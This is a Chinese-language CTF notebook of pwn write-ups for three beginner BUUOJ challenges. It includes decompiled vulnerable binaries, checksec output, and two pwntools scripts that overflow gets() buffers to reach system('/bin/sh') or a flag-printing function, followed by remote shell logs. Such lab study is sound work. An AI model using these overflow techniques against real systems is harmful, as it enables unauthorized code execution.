# PWN做题笔记

## 练习记录

### [PWN-test_your_nc](https://buuoj.cn/challenges#test_your_nc)

下载程序文件，使用 `file` 命令查看，发现这是个 Debian 64 位程序

使用 IDA 64 进行静态分析，找到主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  system("/bin/sh");
  return 0;
}
```

emmmmmmmm...

显然直接 `nc` 到服务器里即可获得 flag

```shell
┌──(hervey㉿Hervey)-[~]
└─$ nc node5.buuoj.cn 29833
ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
cat flag
flag{<flag here>}
```

### [PWN-rip](https://buuoj.cn/challenges#rip)

下载后获得文件 pwn1

先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ file pwn1
pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
```

接着使用 `checksec` 命令识别安全属性

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ checksec --file=pwn1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   64 Symbols        No    0               1               pwn1
```

可以发现无栈保护

使用 IDA 64 进行逆向

`main()` 函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

同时我们还能找到一个 `fun` 函数

```c
int fun()
{
  return system("/bin/sh");
}
```

所以我们的目标应该是利用 `gets()` 这个危险函数的缓冲区溢出漏洞，将 `s` 变量数据溢出到覆盖返回地址，实现跳转到执行 `system("/bin/sh")` 进而去获得 flag

使用 IDA 64 可以轻松地获取 `s` 的地址为 `[rbp-Fh]`

点击 `fun()` 在窗口左下角可以获得该函数位于 `0x401186`

![PWN-rip-1](./Notes-on-PWN/PWN-rip-1.png)

当然，也可以直接从汇编界面找到该函数的地址

![PWN-rip-2](./Notes-on-PWN/PWN-rip-2.png)

![PWN-rip-3](./Notes-on-PWN/PWN-rip-3.png)

由此我们可以写出脚本

```python
from pwn import *
p = remote("<IP Address>", <Port>)
payload = b'A' * 0xF + p64(0x401186)
p.sendline(payload)
p.interactive()
```

运行该脚本，进入容器终端

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ python3 ./sol.py
[+] Opening connection to <IP Address> on port <Port>: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
flag{<flag here>}
```

进而获得 flag

### [PWN-warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)

下载后获得文件 warmup_csaw_2016

先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ file ./warmup_csaw_2016
./warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped
```

接着使用 `checksec` 命令识别安全属性

```shell
┌──(hervey㉿ZHW)-[~/Downloads]
└─$ checksec --file=warmup_csaw_2016
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               warmup_csaw_2016
```

可以发现无栈保护

使用 IDA 64 进行逆向

`main()` 函数

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  char v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

发现有一个 `gets()` 函数，推测应该用栈溢出的方法解决此问题

接下来查看 `v5` 的位置，在 IDA 中双击进入

```asm
-0000000000000042 db ? ; undefined
-0000000000000041 db ? ; undefined
-0000000000000040 var_40 db 64 dup(?)
+0000000000000000  s db 8 dup(?)
+0000000000000008  r db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

可以知道离返回地址的距离为 `0x40 + 0x8`

同时我们还能找到一个 `sub_40060D` 函数

```c
int sub_40060D()
{
  return system("cat flag.txt");
}
```

这个函数的地址在 `0x40060D`

通过调用这个函数就可以获取 flag

由此我们可以写出脚本

```python
from pwn import *
p = remote("<IP Address>", <Port>)
payload = b'A' * (0x40 + 0x8) + p64(0x40060D)
p.sendline(payload)
p.interactive()
```

运行该脚本，获取 flag

```shell
┌──(hervey㉿ZHW)-[~/Downloads]
└─$ python3 ./sol.py
[+] Opening connection to <IP Address> on port <Port>: Done
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>flag{<flag here>}
[*] Got EOF while reading in interactive
$
```

进而获得 flag
